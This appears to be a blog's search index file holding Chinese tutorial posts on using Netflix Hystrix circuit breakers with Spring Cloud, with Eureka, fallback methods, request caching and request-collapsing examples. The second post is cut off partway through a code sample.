<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>Hystrix整合Spring</title>
    <url>/2020/04/25/SpringCloud/2020-04-25-011-Hystrix%E6%95%B4%E5%90%88Spring/</url>
    <content><![CDATA[<h1 id="Hystrix整合Spring"><a href="#Hystrix整合Spring" class="headerlink" title="Hystrix整合Spring"></a>Hystrix整合Spring</h1><p>Hystrix主要用于保护调用服务的一方，如果被调用的服务发生故障，符合一定的条件，就开启断路器，对调用的程序进行隔离。</p>
<p>下面就一个测试项目入口，看看怎么在Spring中使用Hystrix。</p>
<p>测试项目分为3个部分：</p>
<ul>
<li>hystrix-spring-server：作为Eureka服务端，监听端口8761</li>
<li>hystrix-spring-provider：提供REST服务，监听8080端口。提供一个/person/{personId}接口</li>
<li>hystrix-spring-invoker：服务调用方，监听9000端口，提供一个/router/{personId}接口</li>
</ul>
<h2 id="hystrix-spring-server"><a href="#hystrix-spring-server" class="headerlink" title="hystrix-spring-server"></a>hystrix-spring-server</h2><p>pom文件依赖为：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter-web<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.5.12.RELEASE<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.cloud<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-cloud-starter-eureka-server<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>启动程序为：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">@SpringBootApplication</span><br><span class="line">@EnableEurekaServer</span><br><span class="line">public class ServerApplication &#123;</span><br><span class="line"></span><br><span class="line">	public static void main(String[] args) &#123;</span><br><span class="line">		new SpringApplicationBuilder(ServerApplication.class).run(args);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="hystrix-spring-provider"><a href="#hystrix-spring-provider" class="headerlink" title="hystrix-spring-provider"></a>hystrix-spring-provider</h2><p>pom文件依赖为：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.cloud<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-cloud-starter-config<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.cloud<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-cloud-starter-eureka<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>REST controller为：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">PersonController</span> </span>&#123;</span><br><span class="line">	</span><br><span class="line">	<span class="meta">@RequestMapping</span>(value = <span class="string">"/person/&#123;personId&#125;"</span>, method = RequestMethod.GET, </span><br><span class="line">			produces = MediaType.APPLICATION_JSON_VALUE)</span><br><span class="line">	<span class="function"><span class="keyword">public</span> Person <span class="title">findPerson</span><span class="params">(@PathVariable(<span class="string">"personId"</span>)</span> Integer personId, HttpServletRequest request) </span>&#123;</span><br><span class="line">		Person person = <span class="keyword">new</span> Person();</span><br><span class="line">		person.setId(personId);</span><br><span class="line">		person.setName(<span class="string">"Crazyit"</span>);</span><br><span class="line">		person.setAge(<span class="number">33</span>);</span><br><span class="line">		person.setMessage(request.getRequestURL().toString());		</span><br><span class="line">		<span class="keyword">return</span> person;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="meta">@RequestMapping</span>(value = <span class="string">"/hello"</span>, method = RequestMethod.GET)</span><br><span class="line">	<span class="function"><span class="keyword">public</span> String <span class="title">hello</span><span class="params">()</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">		Thread.sleep(<span class="number">800</span>);</span><br><span class="line">		<span class="keyword">return</span> <span class="string">"Hello World"</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="meta">@RequestMapping</span>(value = <span class="string">"/persons"</span>, method = RequestMethod.GET, </span><br><span class="line">			produces = MediaType.APPLICATION_JSON_VALUE)</span><br><span class="line">	<span class="function"><span class="keyword">public</span> List&lt;Person&gt; <span class="title">findPersons</span><span class="params">(@RequestBody List&lt;Integer&gt; personIds, HttpServletRequest request)</span> </span>&#123;</span><br><span class="line">		List&lt;Person&gt; result = <span class="keyword">new</span> ArrayList&lt;Person&gt;();</span><br><span class="line">		<span class="keyword">for</span>(Integer id : personIds) &#123;</span><br><span class="line">			Person person = <span class="keyword">new</span> Person();</span><br><span class="line">			person.setId(id);</span><br><span class="line">			person.setName(<span class="string">"angus"</span>);</span><br><span class="line">			person.setAge(<span class="keyword">new</span> Random().nextInt(<span class="number">30</span>));</span><br><span class="line">			person.setMessage(request.getRequestURL().toString());</span><br><span class="line">			result.add(person);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">return</span> result;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>perosn 类为</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Person</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">private</span> Integer id;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">private</span> String name;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">private</span> Integer age;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">private</span> String message;</span><br><span class="line">	</span><br><span class="line">	<span class="function"><span class="keyword">public</span> Integer <span class="title">getId</span><span class="params">()</span> </span>&#123;</span><br><span class="line">		<span class="keyword">return</span> id;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setId</span><span class="params">(Integer id)</span> </span>&#123;</span><br><span class="line">		<span class="keyword">this</span>.id = id;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="function"><span class="keyword">public</span> String <span class="title">getName</span><span class="params">()</span> </span>&#123;</span><br><span class="line">		<span class="keyword">return</span> name;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setName</span><span class="params">(String name)</span> </span>&#123;</span><br><span class="line">		<span class="keyword">this</span>.name = name;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="function"><span class="keyword">public</span> Integer <span class="title">getAge</span><span class="params">()</span> </span>&#123;</span><br><span class="line">		<span class="keyword">return</span> age;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setAge</span><span class="params">(Integer age)</span> </span>&#123;</span><br><span class="line">		<span class="keyword">this</span>.age = age;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="function"><span class="keyword">public</span> String <span class="title">getMessage</span><span class="params">()</span> </span>&#123;</span><br><span class="line">		<span class="keyword">return</span> message;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setMessage</span><span class="params">(String message)</span> </span>&#123;</span><br><span class="line">		<span class="keyword">this</span>.message = message;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>启动类为</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@SpringBootApplication</span></span><br><span class="line"><span class="meta">@EnableEurekaClient</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ProviderApplication</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">		<span class="comment">// 设置启动的服务器端口</span></span><br><span class="line">		<span class="keyword">new</span> SpringApplicationBuilder(ProviderApplication<span class="class">.<span class="keyword">class</span>).<span class="title">properties</span>(</span></span><br><span class="line">				"server.port=8080").run(args);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="hystrix-spring-invoker"><a href="#hystrix-spring-invoker" class="headerlink" title="hystrix-spring-invoker"></a>hystrix-spring-invoker</h2><p>pom依赖为：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.cloud<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-cloud-starter-config<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.cloud<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-cloud-starter-eureka<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.cloud<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-cloud-starter-ribbon<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.cloud<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-cloud-starter-hystrix<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>Rest Controller为：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span class="meta">@Configuration</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">InvokeController</span> </span>&#123;</span><br><span class="line">    <span class="meta">@Autowired</span></span><br><span class="line">    <span class="keyword">private</span> PersonService personService;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@RequestMapping</span>(value = <span class="string">"/router/&#123;personId&#125;"</span>, method = RequestMethod.GET, produces = MediaType.APPLICATION_JSON_VALUE)</span><br><span class="line">    <span class="function"><span class="keyword">public</span> Person <span class="title">router</span><span class="params">(@PathVariable Integer personId)</span> </span>&#123;</span><br><span class="line">        Person p = personService.getPerson(personId);</span><br><span class="line">        <span class="keyword">return</span> p;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>Person类同hystrix-spring-provider中的person</p>
<p>PersonService为：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Component</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">PersonService</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Autowired</span></span><br><span class="line">    <span class="keyword">private</span> RestTemplate restTemplate;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@HystrixCommand</span>(fallbackMethod = <span class="string">"getPersonFallback"</span>)</span><br><span class="line">    <span class="function"><span class="keyword">public</span> Person <span class="title">getPerson</span><span class="params">(Integer personId)</span> </span>&#123;</span><br><span class="line">        Person p = restTemplate.getForObject(<span class="string">"http://spring-hystrix-provider/person/&#123;personId&#125;"</span>, Person<span class="class">.<span class="keyword">class</span>, <span class="title">personId</span>)</span>;</span><br><span class="line">        <span class="keyword">return</span> p;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Person <span class="title">getPersonFallback</span><span class="params">(Integer id)</span> </span>&#123;</span><br><span class="line">        Person p = <span class="keyword">new</span> Person();</span><br><span class="line">        p.setId(<span class="number">0</span>);</span><br><span class="line">        p.setAge(-<span class="number">1</span>);</span><br><span class="line">        p.setName(<span class="string">"Error"</span>);</span><br><span class="line">        p.setMessage(<span class="string">"Request error"</span>);</span><br><span class="line">        <span class="keyword">return</span> p;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>我们使用注解@HystrixCommand修饰getPerson方法，再配置一个fallbackMethod为getPersonFallback方法。被@HystrixCommand修饰的方法，会被AspectJ进行代理，Spring会将相关的类转换为Bean放到容器中。</p>
<p>最后启动类为：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@SpringBootApplication</span></span><br><span class="line"><span class="meta">@EnableDiscoveryClient</span></span><br><span class="line"><span class="meta">@EnableCircuitBreaker</span></span><br><span class="line"><span class="meta">@ServletComponentScan</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">InvokeApplication</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@LoadBalanced</span></span><br><span class="line">    <span class="meta">@Bean</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> RestTemplate <span class="title">getRestTemplate</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> RestTemplate();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        SpringApplication.run(InvokeApplication<span class="class">.<span class="keyword">class</span>, <span class="title">args</span>)</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>使用注解@EnableCircuitBreaker，启用断路器。</p>
<p>启动三个服务之后，在浏览器中输入<a href="http://localhost:9000/router/2" target="_blank" rel="noopener">http://localhost:9000/router/2</a></p>
<p>就能看到正常结果了</p>
<p><img src="https://huhansi.github.io/images/2020-04-24-hystrix11.png" alt></p>
<p>然后，关闭hystrix-spring-provider，就能看到断路器发挥了作用</p>
<p><img src="https://huhansi.github.io/images/2020-04-24-hystrix12.png" alt></p>
<h2 id="缓存注解"><a href="#缓存注解" class="headerlink" title="缓存注解"></a>缓存注解</h2><p>缓存与合并请求功能需要先初始化请求上下文才能实现。新建一个javax.servlet.filter，用于创建与销毁Hystrix的请求上下文。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@WebFilter</span>(urlPatterns = <span class="string">"/*"</span>, filterName = <span class="string">"hystrixFilter"</span>)</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">HystrixFilter</span> <span class="keyword">implements</span> <span class="title">Filter</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">init</span><span class="params">(FilterConfig filterConfig)</span> <span class="keyword">throws</span> ServletException </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">doFilter</span><span class="params">(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain)</span> <span class="keyword">throws</span> IOException, ServletException </span>&#123;</span><br><span class="line">        HystrixRequestContext context = HystrixRequestContext.initializeContext();</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            filterChain.doFilter(servletRequest, servletResponse);</span><br><span class="line">        &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">            context.shutdown();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">destroy</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>添加CacheService:</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Component</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">CacheService</span> </span>&#123;</span><br><span class="line">    <span class="meta">@CacheResult</span></span><br><span class="line">    <span class="meta">@HystrixCommand</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Person <span class="title">getPerson</span><span class="params">(Integer id)</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"执行getPerson方法"</span>);</span><br><span class="line">        Person p = <span class="keyword">new</span> Person();</span><br><span class="line">        p.setId(id);</span><br><span class="line">        p.setName(<span class="string">"name"</span>);</span><br><span class="line">        <span class="keyword">return</span> p;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>然后在InvokeController中添加/cache/{personId}</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@RequestMapping</span>(value = <span class="string">"/cache/&#123;personId&#125;"</span>, method = RequestMethod.GET, produces = MediaType.APPLICATION_JSON_VALUE)</span><br><span class="line">    <span class="function"><span class="keyword">public</span> Person <span class="title">cacheResult</span><span class="params">(@PathVariable Integer personId)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>;i &lt; <span class="number">3</span>;i++) &#123;</span><br><span class="line">            cacheService.getPerson(personId);</span><br><span class="line">            System.out.println(<span class="string">"控制器调用服务 "</span> + i);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> Person();</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>调用接口/cache/2之后。可以正常获取结果，</p>
<p><img src="https://huhansi.github.io/images/2020-04-24-hystrix14.png" alt></p>
<p>查看后天，可以发现，只有getPerson方法只执行了一次，其他的都是走的缓存。</p>
<p><img src="https://huhansi.github.io/images/2020-04-24-hystrix13.png" alt></p>
<p>缓存相关的注解主要有以下3个：</p>
<ul>
<li>@CacheResult：该注解修饰的方法，表示被修饰的方法返回结果将会被缓存，需要配合@HystrixCommand一起使用</li>
<li>@CacheRemove：用于修饰方法让缓存失效，需要与@CacheResult的缓存key关联</li>
<li>@CacheKey：用于修饰方法参数，表示该参数作为缓存的key</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@CacheResult</span>()</span><br><span class="line"><span class="meta">@HystrixCommand</span>(commandKey = <span class="string">"removeKey"</span>)</span><br><span class="line"><span class="function"><span class="keyword">public</span> String <span class="title">cacheMethod</span><span class="params">(String name)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">"hello"</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">@CacheRemove</span>(commandKey = <span class="string">"removeKey"</span>)</span><br><span class="line"><span class="meta">@HystrixCommand</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> String <span class="title">updateMethod</span><span class="params">(String name)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">"update"</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>以上代码片段中的cacheMethod方法，使用的缓存key为removeKey，方法updateMethod被调用后，将会删除key为removeKey的缓存。</p>
<h2 id="合并请求注解"><a href="#合并请求注解" class="headerlink" title="合并请求注解"></a>合并请求注解</h2><p>在Spring Cloud中同样支持合并请求，在一次HTTP请求的过程中，收集一段时间内的相同请求，放到一个批处理命令中执行。实现合并请求，同样需要先初始化请求上下文。</p>
<p>新增CollapseService</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Component</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">CollapseService</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@HystrixCollapser</span>(batchMethod = <span class="string">"getPersons"</span>, collapserProperties = &#123;</span><br><span class="line">            <span class="meta">@HystrixProperty</span>(name = <span class="string">"timerDelayInMilliseconds"</span>, value = <span class="string">"1000"</span>)</span><br><span class="line">    &#125;)</span><br><span class="line">    <span class="function"><span class="keyword">public</span> Future&lt;Person&gt; <span class="title">getSinglePerson</span><span class="params">(Integer id)</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"执行单个获取的方法"</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@HystrixCommand</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> List&lt;Person&gt; <span class="title">getPersons</span><span class="params">(List&lt;Integer&gt; ids)</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"收集请求，参数数量："</span> + ids.size());</span><br><span class="line">        List&lt;Person&gt; ps = <span class="keyword">new</span> ArrayList&lt;Person&gt;();</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> id : ids) &#123;</span><br><span class="line">            Person p = <span class="keyword">new</span> Person();</span><br><span class="line">            p.setId(id);</span><br><span class="line">            p.setName(String.valueOf(id));</span><br><span class="line">            ps.add(p);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> ps;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>在InvokerController中添加新的/collapse接口</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@RequestMapping</span>(value = <span class="string">"/collapse"</span>, method = RequestMethod.GET, produces = MediaType.APPLICATION_JSON_VALUE)</span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">collapse</span><span class="params">()</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        Future&lt;Person&gt; f1 = collapseService.getSinglePerson(<span class="number">1</span>);</span><br><span class="line">        Future&lt;Person&gt; f2 = collapseService.getSinglePerson(<span class="number">2</span>);</span><br><span class="line">        Future&lt;Person&gt; f3 = collapseService.getSinglePerson(<span class="number">3</span>);</span><br><span class="line"></span><br><span class="line">        Person p1 = f1.get();</span><br><span class="line">        Person p2 = f2.get();</span><br><span class="line">        Person p3 = f3.get();</span><br><span class="line">        System.out.println(p1.getId() + <span class="string">"---"</span> + p1.getName());</span><br><span class="line">        System.out.println(p2.getId() + <span class="string">"---"</span> + p2.getName());</span><br><span class="line">        System.out.println(p3.getId() + <span class="string">"---"</span> + p3.getName());</span><br><span class="line">        <span class="keyword">return</span> <span class="string">""</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>使用</p>
<p>注解@HystrixCollapser(batchMethod = “getPersons”, collapserProperties = {<br>            @HystrixProperty(name = “timerDelayInMilliseconds”, value = “1000”)<br>    })</p>
<p>设置批量方法为getPersons，然后设置时间为1S。即，如果在1S的有相同的请求，就合并，而后调用getPersons方法。</p>
<p>从执行结果看，最终是只执行了getPersons方法。</p>
<p><img src="https://huhansi.github.io/images/2020-04-24-hystrix15.png" alt></p>
<h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><p><a href>疯狂Spring Cloud微服务架构实战</a></p>
]]></content>
      <categories>
        <category>Spring Cloud</category>
      </categories>
      <tags>
        <tag>Hystrix</tag>
        <tag>Spring</tag>
      </tags>
  </entry>
  <entry>
    <title>Hystrix入门</title>
    <url>/2020/04/24/SpringCloud/2020-04-24-010-Hystrix%E5%85%A5%E9%97%A8/</url>
    <content><![CDATA[<h1 id="Hystrix入门"><a href="#Hystrix入门" class="headerlink" title="Hystrix入门"></a>Hystrix入门</h1><p>假设有一个应用程序，有着如下的调用关系：</p>
<p><img src="https://huhansi.github.io/images/2020-04-24-hystrix.png" alt="单体调用"></p>
<p>假设在某个时刻，数据库因为某些原因不可用了，基础服务就会得到“数据库无法访问”的信息，炳辉将次信息告知服务A。在出现问题时，用户不断地请求服务A模块，而服务A模块则继续请求基础服务模块，基础服务模块仍然不停地连接有问题的数据库直到超时，大量用户的请求（包括重试的请求）持续发送过来，整个应用不堪重负。</p>
<p>更有甚者，因为数据库的长时间响应或者无法响应，可能导致整个机房的网络阻塞，影响到同机房的所有其他服务。</p>
<p>这个时候，如果服务A在调用基础模块的时候将基础模块隔离开来，短时间内不再调用基础模块，并且快速响应用户的请求，就可以保证服务A自身乃至整个集群的稳定性。</p>
<p><img src="https://huhansi.github.io/images/2020-04-24-hystrix1.png" alt="单体调用失败熔断"></p>
<p>Hystrix是Netflix下的一个Java库，Spring Cloud将Hystrix整合到Netflix项目中，Hystrix通过添加延迟阈值以及容错的逻辑，来帮助我们控制分布式系统间组件的交互。Hystrix通过隔离服务间的访问点，停止它们之间的级联故障。提供可回退操作来实现容错。</p>
<p>Hystrix主要实现以下功能：</p>
<ul>
<li>当所依赖的网络服务发生延迟或者失败时，对访问的客户端程序进行保护</li>
<li>在分布式系统中，停止级联故障</li>
<li>网络服务恢复正常后，可以快速恢复客户端的访问能力</li>
<li>调用失败时执行服务回退</li>
<li>可支持实时监控、报警和其他操作</li>
</ul>
<h2 id="第一个Hystrix程序"><a href="#第一个Hystrix程序" class="headerlink" title="第一个Hystrix程序"></a>第一个Hystrix程序</h2><h3 id="Hystrix-Server端"><a href="#Hystrix-Server端" class="headerlink" title="Hystrix Server端"></a>Hystrix Server端</h3><p>新建一个Server端项目，提供两个REST服务。一个正常返回，一个“伪装”成故障调用，休眠10S再返回。</p>
<p>pom的依赖如下：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter-web<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.2.6.RELEASE<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>提供REST服务的Controller如下：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MyController</span> </span>&#123;</span><br><span class="line">    <span class="meta">@GetMapping</span>(<span class="string">"/normalHello"</span>)</span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">normalHello</span><span class="params">(HttpServletRequest request)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"Hello world"</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@GetMapping</span>(<span class="string">"/errorHello"</span>)</span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">errorHello</span><span class="params">(HttpServletRequest request)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        Thread.sleep(<span 